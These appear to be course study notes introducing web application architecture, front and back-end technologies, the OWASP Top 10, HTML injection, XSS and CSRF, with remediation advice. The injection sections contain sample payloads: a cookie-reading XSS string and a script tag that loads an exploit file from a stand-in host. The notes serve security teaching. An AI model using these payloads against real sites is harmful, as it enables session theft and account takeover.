# 09_Intro_to_Web_Applications
# Web Applications: Architecture & Attack Surface

## 1. Introduction & Architecture
Web applications operate on a **client-server architecture**, functioning dynamically within web browsers. 
* **Client-Side (Front-End):** The user interface (UI) executing in the browser (HTML, CSS, JavaScript).
* **Server-Side (Back-End):** The core source code, business logic, and databases hosted on back-end servers.

This decentralized execution allows organizations to deploy powerful, globally accessible applications with real-time control over functionality and design (e.g., Google Workspace, AWS Management Console).

## 2. Web Applications vs. Static Websites
The transition from Web 1.0 to Web 2.0 marked the shift from static delivery to dynamic interaction.
* **Traditional Websites (Web 1.0):** Static content requiring manual hardcoding to update. No real-time backend processing or dynamic user interactions.
* **Web Applications (Web 2.0):** Fully functional, modular applications generating dynamic content based on user input. They are responsive, scalable, and execute without client-side hardware optimization requirements.

## 3. Web Apps vs. Native OS Applications
### Web Applications
* **Pros:** Platform-independent, zero local storage consumption, and **version unity** (centralized patching ensures all users run the same updated version simultaneously).
* **Cons:** Slower execution compared to native apps; restricted by browser capabilities.

### Native OS Applications
* **Pros:** Faster execution, deep OS integration, and direct hardware/local library utilization.
* **Cons:** High maintenance overhead (requires different builds for Windows, macOS, Linux) and decentralized patching.

> **Note:** Modern environments increasingly utilize Hybrid and Progressive Web Applications (PWAs), leveraging modern frameworks to bridge the gap between web portability and native OS performance.

## 4. Distribution Models
Organizations deploy web applications based on specific infrastructure needs:
* **Open-Source (Customizable):** WordPress, Joomla, OpenCart.
* **Closed-Source/Proprietary (SaaS/Subscription):** Shopify, Wix, DotNetNuke.

## 5. Security Risks & Penetration Testing Methodology
Web applications present a massive, globally exposed attack surface. The complexity of modern app stacks increases the likelihood of critical vulnerabilities being deployed into production. A successful breach can result in severe business interruptions and lateral movement into sensitive corporate databases.

### Testing Methodology (OWASP WSTG)
Security assessments must cover both unauthenticated and authenticated perspectives to maximize coverage:
1. **Front-End Triage:** Inspecting HTML, CSS, and JS for client-side vulnerabilities like Cross-Site Scripting (XSS) and Sensitive Data Exposure.
2. **Back-End & Core Logic:** Analyzing browser-to-server HTTP interactions, enumerating backend technologies, and probing for logic flaws and injection points.

## 6. Common Attack Vectors & Real-World Impact
Web apps rarely present immediate, unauthenticated Remote Code Execution (RCE) out of the box. Exploitation typically involves chaining multiple vulnerabilities.

| Vulnerability | Real-World Attack Scenario | Impact |
| :--- | :--- | :--- |
| **SQL Injection (SQLi)** | Extracting usernames/emails from an Active Directory-backed web app to perform **Password Spraying** attacks against corporate portals (VPN, O365). | Unauthorized data access, network foothold, or potential RCE. |
| **File Inclusion (LFI/RFI)** | Reading backend source code to uncover hidden directories, exposing administrative endpoints. | Source code disclosure, potential RCE. |
| **Unrestricted File Upload** | Bypassing client-side filters on a profile picture upload form to upload a reverse shell payload (`.php`, `.aspx`). | Total web server compromise. |
| **Insecure Direct Object Reference (IDOR)** | Tampering with URI parameters (e.g., changing `/user/701/edit` to `/user/702/edit`) combined with broken access control. | Unauthorized access to other users' sensitive data or functionality. |
| **Broken Access Control** | Manipulating POST request parameters during account registration (e.g., intercepting the request and changing `roleid=3` to `roleid=1`). | Privilege escalation, granting rogue administrative access. |

# Web Application Layout & Architecture

## 1. Executive Overview
Web applications are highly diverse in design, programmatic structure, and backend infrastructure. From a SysAdmin and Pentester perspective, understanding the underlying layout is critical for identifying potential attack vectors and ensuring robust deployment.

The web application layout is divided into three core domains:
* **Infrastructure:** The physical or virtual topology required for the application to function (e.g., web servers, database servers).
* **Components:** The individual elements the application interacts with across the UI/UX, Client, and Server boundaries.
* **Architecture:** The logical relationships, communication flows, and dependencies between the various components.

---

## 2. Infrastructure Deployment Models
Web applications rely on various infrastructure setups, commonly referred to as deployment models. The architecture chosen directly impacts scalability, redundancy, and security.

### 2.1. Client-Server Model
The foundational model where a backend server hosts the application and distributes it to accessing clients (browsers).
* **Workflow:** The client accesses the URL -> The browser sends an HTTP request -> The server processes the request (e.g., authentication, database queries) -> The server returns the response to the client for rendering.
* **Execution:** Frontend components are executed client-side (interpreted by the browser), while backend components are compiled/interpreted server-side.

### 2.2. Single Server Architecture
All components (web application, background services, and the database) are hosted on a single machine.
* **Pros:** Straightforward deployment and low maintenance overhead.
* **Cons (Security & Reliability):** Represents a single point of failure (SPOF). This is an "all eggs in one basket" scenario; if the server is compromised or experiences downtime, all hosted applications and data are exposed or rendered inaccessible.

### 2.3. Many Servers - One Database
A segmented model where the database resides on a dedicated server, accessed by one or multiple web servers.
* **Use Case:** Load balancing, primary/backup replication, or shared datasets across multiple related applications.
* **Security Advantage:** Implements **Asset Segmentation**. If a web server is compromised, the attacker does not automatically gain operating system-level access to the database. Similarly, a SQL Injection (SQLi) vulnerability does not immediately compromise the web server's OS. Strict access controls (Least Privilege) are still mandatory.

### 2.4. Many Servers - Many Databases
A highly distributed model where each web application relies on its own dedicated database, often hosted on separate database servers.
* **Use Case:** High Availability (HA) and enterprise redundancy. Often relies on load balancers and automated failover mechanisms.
* **Security Advantage:** Optimal access control and data isolation. An isolated breach is contained within that specific application's environment.

---

## 3. Core Web Application Components
Regardless of the infrastructure model, modern web applications can be broken down into the following core elements:
* **Client** (Web Browser / Mobile App)
* **Web Server** (e.g., Nginx, Apache, IIS)
* **Application Logic** (The backend code processing requests)
* **Database** (e.g., MySQL, PostgreSQL, MongoDB)
* **Services / Microservices**
* **3rd Party Integrations** (APIs)
* **Serverless Functions**

---

## 4. Three-Tier Architecture
Web application components are logically separated into three distinct layers to maintain a clean separation of concerns:

| Layer | Description |
| :--- | :--- |
| **Presentation Layer** | The UI components that enable system interaction. Accessed by the client via the browser and rendered using HTML, CSS, and JavaScript. |
| **Application Layer** | The logical backend where all client web requests are processed. It handles business logic, authorization, privilege validation, and data routing. |
| **Data Layer** | Works in tandem with the Application Layer to store, retrieve, and manage persistent data securely. |

*Note: Certain web servers can also execute OS-level calls and run localized binaries (e.g., IIS ISAPI, PHP-CGI).*

---

## 5. Modern Architectures: Microservices & Serverless

### 5.1. Microservices (Service-Oriented Architecture - SOA)
Microservices decouple core web application tasks into independent, single-purpose components (e.g., Registration, Payments, Search).
* **Characteristics:** Communication between microservices is **stateless** (requests and responses are completely independent). Each service manages its own data structure and can be written in different programming languages.
* **Benefits:** Agility, flexible scaling, rapid CI/CD deployment, reusable code, and high fault tolerance (Resilience).

### 5.2. Serverless Computing
Cloud-native architectures (AWS Lambda, Azure Functions, GCP Cloud Functions) where the cloud provider dynamically manages the allocation and provisioning of servers.
* **Characteristics:** Applications run in stateless computing containers triggered by specific events.
* **Benefits:** Completely removes the SysAdmin overhead of patching, scaling, and maintaining the underlying host OS. 

---

## 6. Architecture Security & Pentesting Implications
During a penetration test, mapping the underlying architecture is just as critical as finding code-level vulnerabilities. Structural design flaws often lead to the most critical compromises.

* **Access Control Flaws:** An application might have secure code, but a broken architectural design regarding Role-Based Access Control (RBAC) could allow Privilege Escalation or Insecure Direct Object References (IDOR). Fixing these requires costly and time-consuming architectural overhauls.
* **Post-Exploitation Awareness:** If a backend server is compromised but the database cannot be located locally, the architecture likely relies on a segregated database server. Proper enumeration is required to map out the segmented network and identify all connected databases. 
* **DevSecOps:** Security must be integrated into every phase of the Software Development Life Cycle (SDLC) to prevent architectural vulnerabilities before deployment.

# Web Application Architecture & Security: Front End vs. Back End

Modern web applications are built on a Full Stack architecture, divided into two distinct environments with different functional boundaries, technologies, and attack surfaces: the Front End (client-side) and the Back End (server-side).

---

## 1. Front End (Client-Side)

The Front End handles everything the user interacts with directly via their web browser. It relies heavily on client-side processing, meaning performance and rendering happen locally on the user's machine.

* **Core Technologies:** HTML (structure), CSS (presentation), and JavaScript (behavior/logic).
* **Key Requirements:** Must be highly optimized, responsive across device form factors (mobile, desktop), and cross-browser compatible.
* **Roles & Tasks:** Visual Concept Design, User Interface (UI), and User Experience (UX) design.
* **Security Perspective:** The client-side is inherently untrusted. Since the source code is rendered locally, it is fully visible and manipulable by the user (or attacker).

## 2. Back End (Server-Side)

The Back End drives the core business logic, processes data, and handles server-to-client communication. It is isolated from direct user interaction.

### 2.1 Core Infrastructure Components

| Component | Description | Technologies / Examples |
| :--- | :--- | :--- |
| **Servers / OS** | The underlying infrastructure hosting the application and its dependencies. | Linux, Windows Server, Docker Containers. |
| **Web Servers** | Software handling incoming HTTP/HTTPS requests and routing traffic. | Apache, Nginx, IIS. |
| **Databases** | Storage systems for retrieving and managing application data. | **Relational:** MySQL, PostgreSQL, Oracle.<br>**Non-Relational:** MongoDB, NoSQL. |
| **Frameworks** | Core environments used to develop and structure the web application logic. | Laravel (PHP), ASP.NET (C#), Spring (Java), Django (Python), Express (Node.js). |

### 2.2 Operational Logic & Containerization
To enforce logical separation and limit the blast radius of potential compromises, backend services are often containerized (e.g., using Docker). This allows the database and the web application to run in isolated environments, securing the infrastructure against lateral movement.

**Core Back End Responsibilities:**
* Developing APIs for Front End communication.
* Managing database queries and state.
* Implementing business logic and integrating third-party cloud services.

---

## 3. Security Posture & Pentesting Methodologies

Web applications are exposed to various attack vectors, primarily through injection vulnerabilities (e.g., SQL Injection, OS Command Injection) where unsanitized user input is processed by the backend.

* **Whitebox Pentesting:** Involves full source code access. Standard for Front End testing (since code is public) or open-source backend applications. Allows for deep static code analysis to uncover hardcoded credentials or logical flaws.
* **Blackbox Pentesting:** Involves testing the application from the outside without source code access. This is the default approach for proprietary Back Ends. 
* *Note:* Vulnerabilities like Local File Inclusion (LFI) can bridge this gap by allowing attackers to read backend source code, effectively pivoting an assessment from Blackbox to Whitebox.

---

## 4. Threat Landscape: Misconfigurations & Vulnerabilities

### Top 20 Web Developer Security Mistakes
As penetration testers, identifying these common architectural and coding flaws is critical during reconnaissance and exploitation phases:

1. Permitting Invalid Data to Enter the Database
2. Focusing on the System as a Whole (Ignoring modular security)
3. Establishing Personally Developed (Custom) Security Methods
4. Treating Security as the Last Step (Lack of DevSecOps)
5. Plain Text Password Storage
6. Creating Weak Passwords
7. Storing Unencrypted Data in the Database
8. Depending Excessively on Client-Side Validation
9. Being Too Optimistic (Assuming secure user behavior)
10. Permitting Variables via the URL Path Name
11. Trusting Third-Party Code / Dependencies
12. Hard-Coding Backdoor Accounts or Credentials
13. Unverified SQL Injections
14. Remote File Inclusions (RFI)
15. Insecure Data Handling
16. Failing to Encrypt Data Properly
17. Not Using a Secure Cryptographic System
18. Ignoring Layer 8 (Human error/social engineering)
19. Failing to Review User Actions (Lack of logging)
20. Web Application Firewall (WAF) Misconfigurations

### OWASP Top 10 Web Application Vulnerabilities
These developer mistakes directly map to the most critical security risks defined by OWASP:

| Rank | Vulnerability |
| :---: | :--- |
| **1** | Broken Access Control |
| **2** | Cryptographic Failures |
| **3** | Injection |
| **4** | Insecure Design |
| **5** | Security Misconfiguration |
| **6** | Vulnerable and Outdated Components |
| **7** | Identification and Authentication Failures |
| **8** | Software and Data Integrity Failures |
| **9** | Security Logging and Monitoring Failures |
| **10** | Server-Side Request Forgery (SSRF) |

# Web Applications: HTML & The DOM

## 1. HTML (HyperText Markup Language) Overview
HTML serves as the foundational skeleton of web applications. It constructs the basic elements of a web page—such as forms, images, titles, and structural containers—which the browser parses and renders to the end-user.

### Basic HTML Structure
Elements are strictly organized in a hierarchical, tree-like structure, heavily resembling XML. The root `<html>` tag encapsulates the entire document.

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1 id="main-heading">A Heading</h1>
        <p class="content-text">A Paragraph</p>
    </body>
</html>
```

**Key Tag Mechanics:**
* Elements rely on opening `<tag>` and closing `</tag>` syntax.
* Attributes like `id` (unique identifier) or `class` (group identifier) are embedded within the opening tag. These attributes are critical injection points when crafting CSS or DOM-based exploits.

## 2. Document Object Model (DOM) Tree
The browser constructs a DOM representation of the HTML document. The W3C defines the DOM as a platform- and language-neutral interface allowing scripts (e.g., JavaScript) to dynamically access and update document content, structure, and style.

```text
document
 └── html
     ├── head
     │   └── title
     └── body
         ├── h1
         └── p
```

**DOM Standards Breakdown:**
* **Core DOM:** Standard model for all document types.
* **XML DOM:** Standard model for XML.
* **HTML DOM:** Standard model specifically for HTML documents.

> **Security Implication:** Understanding the HTML DOM hierarchy (e.g., referencing `document.head` or targeting elements via `getElementById()`) is paramount for identifying injection vectors. Manipulating existing DOM elements or forging new ones is the core methodology behind Cross-Site Scripting (XSS) attacks.

## 3. URL Encoding (Percent-Encoding)
Browsers transmit URLs using the standard ASCII character set. Because HTTP requests cannot process raw special characters or spaces within URLs, unsafe characters must be URL-encoded. This process replaces non-ASCII or unsafe characters with a `%` followed by their two-digit Hexadecimal equivalent.

**Common Encoding Reference:**

| Character | URL Encoded | Description |
| :---: | :---: | :--- |
| `[space]` | `%20` or `+` | Space character |
| `!` | `%21` | Exclamation mark |
| `"` | `%22` | Double quote |
| `#` | `%23` | Hash / Fragment identifier |
| `$` | `%24` | Dollar sign |
| `%` | `%25` | Percent (used for encoding) |
| `&` | `%26` | Ampersand (parameter separator) |
| `'` | `%27` | Single quote |

> **Operational Note:** Proficiency in URL encoding/decoding is a fundamental requirement for IT Security and SysAdmins. It is routinely used to obfuscate payloads, troubleshoot HTTP routing issues, or ensure crafted web requests traverse proxies and WAFs (Web Application Firewalls) cleanly. Burp Suite's native Decoder tab is the industry-standard tool for rapid string conversions during web pentesting.

## 4. Operational Usage & Element Context
Understanding the structural separation within an HTML document is crucial for mapping an application's attack surface:
* `<head>`: Contains metadata not directly rendered on the main canvas (e.g., page title, charset, external dependencies).
* `<body>`: Contains the rendered layout payload (text, media, inputs, forms).
* `<style>`: Embeds internal CSS for styling. 
* `<script>`: Embeds JavaScript logic. *High-value target for code injection and execution.*

# Cascading Style Sheets (CSS)

## Overview
CSS (Cascading Style Sheets) is the foundational stylesheet language used in conjunction with HTML to control the presentation, formatting, and overall visual structure of web pages. As web standards evolve, subsequent iterations of CSS introduce advanced rendering capabilities natively supported by modern browsers.

## Fundamental Mechanics
At its core, CSS targets specific HTML elements (such as tags, classes, or IDs) and defines their styling rules. This architecture allows for centralized design management across an entire web application. 

Common target properties include `font-family`, `background-color`, `text-align`, and spatial dimensions like `margin`, `padding`, and `border`.

### Syntax Structure
CSS rulesets consist of a **selector** followed by a declaration block enclosed in curly braces `{}`. Each declaration pairs a property with a specific value, terminated by a semicolon `;`.

```css
/* Target by HTML Tag */
body {
  background-color: #000000;
}

h1 {
  color: #FFFFFF;
  text-align: center;
}

/* Target by specific ID or Class (crucial for JS DOM manipulation) */
.custom-paragraph {
  font-family: 'Helvetica', sans-serif;
  font-size: 14px;
}
```

## Advanced Capabilities
Beyond static formatting, modern CSS handles complex animations and dynamic spatial rendering (e.g., 3D transformations) without relying heavily on client-side scripting.

* **Animations:** Properties like `@keyframes`, `animation-duration`, and `animation-direction` allow elements to transition smoothly between different states, timelines, and coordinates.
* **Extensibility:** CSS syntax and styling principles are frequently adapted for XML formatting, SVG styling, and designing entire User Interfaces (UI) within modern mobile app development platforms.

## Interoperability with JavaScript
In modern web development, CSS works in tandem with JavaScript. While CSS defines the static and animated visual states, JavaScript is leveraged to execute logic and dynamically manipulate CSS classes or properties in real-time. This synergy is used to react to keystrokes and mouse events, or to generate advanced UI behaviors like Parallax depth effects.

## CSS Frameworks & Preprocessors
Manually writing vanilla CSS for enterprise-scale web applications can be inefficient and difficult to scale. To optimize workflows, ensure cross-browser compatibility, and enforce responsive design standards, developers utilize CSS frameworks and preprocessors. These toolkits provide pre-built, reusable stylesheets and components.

Some of the most widely adopted frameworks in modern environments include:

* **Bootstrap:** The industry-standard UI framework for responsive, mobile-first front-end web development.
* **Sass (Syntactically Awesome Style Sheets):** A powerful CSS extension language (preprocessor) that introduces programming concepts like variables, nested rules, and mixins into CSS.
* **Foundation:** A highly customizable, responsive front-end framework heavily used in enterprise-level applications.
* **Bulma:** A modern, lightweight CSS framework based entirely on Flexbox.
* **Pure:** A minimalist, responsive CSS module suite developed by Yahoo, ideal for lightweight footprint requirements.


# Web Architecture: JavaScript Fundamentals

## Overview
JavaScript (JS) is a core programming language of the web, functioning primarily as a client-side scripting language executed directly within the browser. While HTML structures the content and CSS handles the presentation, JavaScript dictates the behavior, logic, and interactivity of a webpage. 

Although traditionally restricted to the front end, modern implementations like **Node.js** allow JavaScript to function as a robust back-end language, enabling full-stack web application development. Without JS, web pages would remain completely static, lacking interactive elements or real-time state changes.

## Implementation Methods
JavaScript interacts with the web page's source code via the `<script>` tag. There are two primary ways to load JS into the Document Object Model (DOM):

### 1. Inline Execution
Code is embedded directly within the HTML document. While useful for quick scripts, it is generally avoided in production environments in favor of modularity.
```html
<script type="text/javascript">
    // JavaScript logic goes here
</script>
```

### 2. External Sourcing
Code is loaded from an external file. This is the industry standard practice as it improves code maintainability and allows the browser to cache the script.
```html
<script src="./script.js"></script>
```

## DOM Manipulation & Core Functionality
A fundamental use case for JavaScript is interacting with and dynamically modifying HTML elements. 

```javascript
// Targeting an HTML element by its ID and altering its inner text
document.getElementById("button1").innerHTML = "Changed Text!";
```
In a functional web application, this type of execution is typically bound to an event listener, meaning the script triggers only when a specific action occurs (e.g., an end-user clicking the "button1" element).

## Advanced Usage & Asynchronous Operations
Modern web browsers are equipped with highly optimized JavaScript engines that execute code locally on the client-side. This drastically reduces server overhead and allows for rapid processing. Key functionalities include:

* **Dynamic DOM Updates:** Altering the webpage view and content in real-time without requiring a full page reload.
* **Asynchronous Requests (AJAX):** Performing HTTP requests in the background to interact with back-end APIs, sending and retrieving data seamlessly.
* **User Input Processing:** Validating and sanitizing data entered by the user before transmission.
* **Advanced Animations:** Driving complex, interactive visual sequences that surpass the limitations of pure CSS.

## Front-End Frameworks
As enterprise web applications scale in complexity, developing entirely in "vanilla" (pure) JavaScript becomes inefficient. To streamline the development pipeline, the industry relies on JavaScript frameworks and libraries. 

These platforms abstract complex backend-like functionalities (such as routing, state management, and user authentication) into modular components, often dynamically generating HTML rather than relying on static files.

Some of the most prominent front-end frameworks and libraries encountered in modern infrastructure include:
* **React**
* **Angular**
* **Vue**
* **jQuery** *(Considered legacy, but still widely deployed in older environments)*

# Front-End Vulnerabilities: Sensitive Data Exposure

## 1. Overview
While the majority of web application penetration testing targets back-end infrastructure, front-end components present a critical attack surface. Although client-side execution isolates the core back-end from direct exploitation, vulnerabilities here can severely compromise end-users. If an attacker leverages a front-end flaw against an administrative user, it can rapidly escalate to unauthorized backend access, sensitive data leaks, and widespread service disruption.

## 2. Information Gathering & Attack Vectors
**Sensitive Data Exposure** occurs when sensitive information is inadvertently transmitted in clear-text to the client-side environment. This data typically resides in the HTML source code, embedded JavaScript, or external asset links.

### Reconnaissance Techniques
* **Page Source Inspection:** Bypassing UI restrictions (like disabled right-clicks) using `Ctrl + U` or intercepting traffic via web proxies such as **Burp Suite**.
* **Targeting 'Low-Hanging Fruit':**
    * Hardcoded login credentials or cryptographic hashes.
    * Leftover developer comments (e.g., ``).
    * Exposed API endpoints, hidden directories, or debugging parameters.
    * Unintended user data leakage.

## 3. Proof of Concept (PoC)
During an assessment, an apparently secure authentication form might conceal critical flaws within its source code. 

**Target:** Standard Login Form
**Finding:** Hardcoded credentials exposed within HTML comments.

```html
<form action="action_page.php" method="post">
    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <button type="submit">Login</button>
    </div>
</form>
```

**Impact:** The failure to sanitize developer comments provides immediate, unauthorized access using the `test:test` credentials. Automated source code analyzers can easily scrape this type of leakage to map hidden functionality or escalate privileges across the web application.

## 4. Remediation & DevSecOps Strategies
To mitigate Sensitive Data Exposure on the client-side, the following practices should be implemented:
* **Code Sanitization:** Ensure production front-end code is rigorously stripped of debugging parameters, test directories, and developer comments.
* **Data Classification:** Strictly classify data types and enforce access controls to determine what is permissible for client-side exposure.
* **Obfuscation & Packing:** Utilize JavaScript minification, packing, and obfuscation techniques to complicate reverse-engineering and deter automated scraping tools.
* **Code Review Pipeline:** Integrate mandatory peer reviews and automated SAST (Static Application Security Testing) tools into the CI/CD pipeline prior to deployment to catch exposed information.

# Frontend Security: HTML Injection & Input Validation

## 1. Overview
Validating and sanitizing accepted user input is a critical component of modern web security. While input validation is traditionally handled on the backend, certain architectures process and render user input entirely on the client side (frontend) without it ever reaching the server. Therefore, implementing robust input sanitization on both layers (Frontend and Backend) is a mandatory security practice.

**HTML Injection** occurs when a web application receives unfiltered user input and dynamically renders it on the page. This vulnerability generally manifests in two primary ways:
* **Stored/Persistent:** Retrieving previously submitted malicious payloads from a backend database (e.g., retrieving an unsanitized user comment).
* **Reflected/DOM-based:** Directly displaying unfiltered input via JavaScript locally on the frontend.

## 2. Security Impact
When an attacker has arbitrary control over how input is rendered, they can inject malicious HTML tags. The browser executes this as part of the Document Object Model (DOM), leading to severe consequences:
* **Credential Harvesting:** Injecting rogue HTML elements, such as external login forms, designed to spoof authentication prompts and siphon user credentials to an attacker-controlled server.
* **Web Page Defacement:** Overwriting the DOM to alter the site's visual appearance, insert unauthorized advertisements, or cause reputational damage to the organization hosting the application.

## 3. Proof of Concept (PoC): DOM-Based HTML Injection

### 3.1. Vulnerable Code Analysis
The following HTML snippet demonstrates a highly vulnerable implementation. The JavaScript function `inputFunction()` captures user input via a `prompt()` dialogue and injects it directly into the DOM using the dangerous `.innerHTML` property without prior sanitization or encoding.

```html
<!DOCTYPE html>
<html>
<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");
            
            // VULNERABILITY: Directly rendering unfiltered input via innerHTML
            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>
</html>
```

### 3.2. Exploitation Phase
To verify the HTML Injection vulnerability, we can supply a payload designed to alter the DOM's structure. In this scenario, we inject CSS via HTML `<style>` tags to overwrite the `background-image` property of the `body` element.

**Malicious Payload:**
```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

**Execution & Result:**
Upon submitting the payload through the prompt, the `.innerHTML` property parses the `<style>` tag natively. The browser instantly applies the styling, replacing the page's background with the target external SVG image. 

*Note on Persistence:* Since this specific PoC is DOM-based and executed entirely on the client's frontend session, the injected payload is non-persistent. A simple browser refresh will clear the injected HTML and restore the DOM to its default state.

# Cross-Site Scripting (XSS)

## Overview
HTML Injection vulnerabilities often serve as a stepping stone for Cross-Site Scripting (XSS) attacks. While HTML Injection is limited to rendering rogue markup, XSS escalates the threat by injecting malicious JavaScript code that executes directly on the client side. Achieving arbitrary code execution within the victim's browser can lead to account takeover, session hijacking, or deeper client-side exploitation.

## XSS vs. HTML Injection
Though similar in their execution methodology and reliance on poor input sanitization, the primary distinction lies in the payload. XSS specifically leverages JavaScript to perform advanced client-side attacks, whereas HTML Injection is generally restricted to altering the page's structural or visual integrity.

## Primary Types of XSS

| Type | Description |
| :--- | :--- |
| **Reflected XSS** | Occurs when malicious user input is immediately returned (reflected) by the web application—such as in an error message or search result—without proper sanitization or encoding. |
| **Stored XSS** | Arises when a malicious payload is permanently stored on the target server (e.g., in a database via forum posts or comment sections) and executes whenever victims retrieve the affected data. |
| **DOM-based XSS** | Exploits vulnerabilities within the client-side code rather than the server backend. The payload is written directly to an HTML Document Object Model (DOM) object within the browser (e.g., manipulating the page title or URL parameters). |

## Proof of Concept (PoC): DOM XSS Cookie Stealing
In environments lacking proper input sanitization (similar to basic HTML Injection scenarios), DOM-based XSS can be easily exploited to retrieve sensitive session data. 

### Payload Execution
```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

### Attack Mechanism
1. **Injection:** The payload is injected into a vulnerable input field.
2. **DOM Manipulation:** The browser processes the input, interpreting it as a completely new DOM element.
3. **Execution:** The `onerror` event handler triggers the JavaScript `alert(document.cookie)`, accessing the HTML document tree to retrieve the current session cookie object and displaying it in a pop-up dialog.
4. **Impact:** In a real-world scenario, instead of simply alerting the user, an attacker would replace the `alert` function with a request (e.g., using `fetch()` or `XMLHttpRequest`) to silently exfiltrate the `document.cookie` value to an attacker-controlled server. This enables session hijacking, allowing the attacker to authenticate as the victim without requiring credentials.

# Cross-Site Request Forgery (CSRF)

## 1. Vulnerability Overview
Cross-Site Request Forgery (CSRF) is a client-side vulnerability where an attacker coerces an authenticated user into executing unauthorized actions on a web application. By exploiting the application's trust in the victim's active session, attackers can hijack queries and API calls. CSRF is frequently chained with Cross-Site Scripting (XSS) or manipulates HTTP parameters to seamlessly execute malicious requests on behalf of the victim.

## 2. Exploitation Scenarios

### 2.1. Account Takeover via Password Reset
A classic CSRF vector targets the account management functionality. An attacker crafts a JavaScript payload designed to force a password change to an attacker-controlled value.
* **Execution:** The payload is injected into a vulnerable endpoint (e.g., a stored XSS vulnerability within a comment section).
* **Impact:** When the authenticated victim views the malicious entry, the payload executes automatically in the background, leveraging the active session to change the password. The attacker then logs in, resulting in a full account takeover.

### 2.2. Privilege Escalation Targeting Administrators
Administrators possess highly sensitive privileges that, if compromised, can lead to complete back-end server control. Instead of extracting session cookies (which might be protected by `HttpOnly` flags), attackers can force the admin's browser to execute administrative functions.
* **Payload Delivery:** Rather than embedding the entire script inline, attackers often load remote malicious scripts:
    ```html
    "><script src=//www.example.com/exploit.js></script>
    ```
* **Mechanics:** The `exploit.js` file is custom-built after analyzing the target application's APIs and state-changing procedures. Once triggered by the admin, the script replicates the required HTTP requests to execute privileged actions automatically.

## 3. Prevention & Mitigation Strategies

Robust defense against CSRF and related injection attacks (like XSS) requires a defense-in-depth approach, validating and sanitizing data across both front-end and back-end environments.

### 3.1. Input Handling
While back-end validation is mandatory, applying front-end controls prevents malicious payloads from rendering on the client side even if back-end filters fail.

| Control | Description |
| :--- | :--- |
| **Sanitization** | Stripping or encoding special and non-standard characters from user input before processing, storing, or displaying it (Output Encoding). |
| **Validation** | Verifying that the submitted input strictly matches the expected format, length, and type (e.g., ensuring an email field only accepts a valid email address structure). |

### 3.2. Defense-in-Depth Mechanisms
* **Anti-CSRF Tokens:** Implement unique, unpredictable, and session-specific tokens for every state-changing request. The server must validate this token before processing the transaction.
* **SameSite Cookie Attribute:** Enforce `SameSite=Strict` or `SameSite=Lax` on session cookies to instruct the browser not to send authentication cookies alongside cross-origin requests.
* **Re-Authentication:** Require users to input their current password or complete a multi-factor authentication (MFA) prompt before executing highly sensitive actions (e.g., changing passwords, updating emails).
* **Web Application Firewalls (WAF):** Deploy a WAF to automatically detect and block common injection patterns. *Note: WAFs serve as an additional security layer and should never replace secure coding practices, as their rulesets can often be bypassed.*

> **Security Mindset:** Modern browsers implement built-in protections against automatic JS execution, and frameworks offer native Anti-CSRF mechanisms. However, misconfigurations or chaining vulnerabilities can bypass these safeguards. Applications must be secure by design, treating these mechanisms as complementary layers rather than absolute fixes.

# Web Application Architecture: Back-End Servers

## 1. Overview
A **back-end server** constitutes the underlying hardware and operating system environment hosting the applications required to run a web service. Functioning within the **Data Access Layer**, it acts as the core computational engine, executing all internal processes and transactions that drive the web application ecosystem.

## 2. Software Architecture
The back-end environment typically integrates three primary software components to process client requests and manage data:

1. **Web Server:** Handles HTTP/HTTPS requests and serves content (e.g., Apache, NGINX, IIS).
2. **Database Management System (DBMS):** Stores, retrieves, and manages structured/unstructured data (e.g., MySQL, MS SQL, Oracle).
3. **Development Framework:** The backend logic and application codebase (e.g., PHP, C#, Java, Node.js).

> **Infrastructure Note:** Beyond the core components, modern enterprise back-ends frequently deploy supplementary layers such as **Hypervisors** (for VM management), **Containers** (e.g., Docker for microservices), and **Web Application Firewalls (WAFs)** to harden the security perimeter against Layer 7 attacks.

### 2.1 Common Web Solution Stacks
Back-end components are routinely standardized into specific "stacks" to streamline deployment and ensure compatibility. The most prevalent combinations include:

| Stack | Operating System | Web Server | Database | Language |
| :--- | :--- | :--- | :--- | :--- |
| **LAMP** | Linux | Apache | MySQL | PHP / Python / Perl |
| **WAMP** | Windows | Apache | MySQL | PHP / Python / Perl |
| **WINS** | Windows | IIS | SQL Server | .NET / C# |
| **MAMP** | macOS | Apache | MySQL | PHP / Python / Perl |
| **XAMPP**| Cross-Platform | Apache | MariaDB/MySQL | PHP / Perl |

## 3. Hardware & Infrastructure Scalability
The underlying hardware specifications (CPU, RAM, I/O throughput) directly dictate the application's stability and responsiveness. However, modern infrastructure design moves away from monolithic, single-server deployments to ensure High Availability (HA) and fault tolerance:

* **Load Distribution:** Enterprise web applications distribute incoming traffic across a cluster of back-end servers (using Load Balancers) to optimize resource utilization and prevent bottlenecks.
* **Virtualization & Cloud:** Applications increasingly run on abstracted hardware, utilizing virtual hosts provisioned through data centers or Cloud Service Providers (IaaS/PaaS) rather than relying exclusively on bare-metal servers.

# Web Servers & HTTP Protocol Fundamentals

## 1. Architecture Overview
A web server is a backend application responsible for handling HTTP/HTTPS traffic from client browsers. Operating primarily over **TCP port 80 (HTTP)** and **TCP port 443 (HTTPS)**, the server processes incoming requests, routes them to the requested web application core files, and delivers the appropriate HTTP responses (text, JSON, or binary data) back to the end-user.

## 2. HTTP Status Codes
Web servers acknowledge client requests through standardized 3-digit HTTP response codes.

| Code | Status | Description |
| :--- | :--- | :--- |
| **200** | `OK` | Successful request. The payload was delivered. |
| **301** | `Moved Permanently` | Resource URL has permanently changed. |
| **302** | `Found` | Resource URL has temporarily changed (redirection). |
| **400** | `Bad Request` | Invalid syntax; the server could not understand the request. |
| **401** | `Unauthorized` | Unauthenticated attempt to access a protected resource. |
| **403** | `Forbidden` | Authenticated but insufficient access rights to the content. |
| **404** | `Not Found` | The requested resource does not exist on the server. |
| **405** | `Method Not Allowed` | HTTP method (e.g., POST, PUT) is disabled for the requested endpoint. |
| **408** | `Request Timeout` | Sent on an idle connection, occasionally without a prior client request. |
| **500** | `Internal Server Error` | Unhandled server-side exception or misconfiguration. |
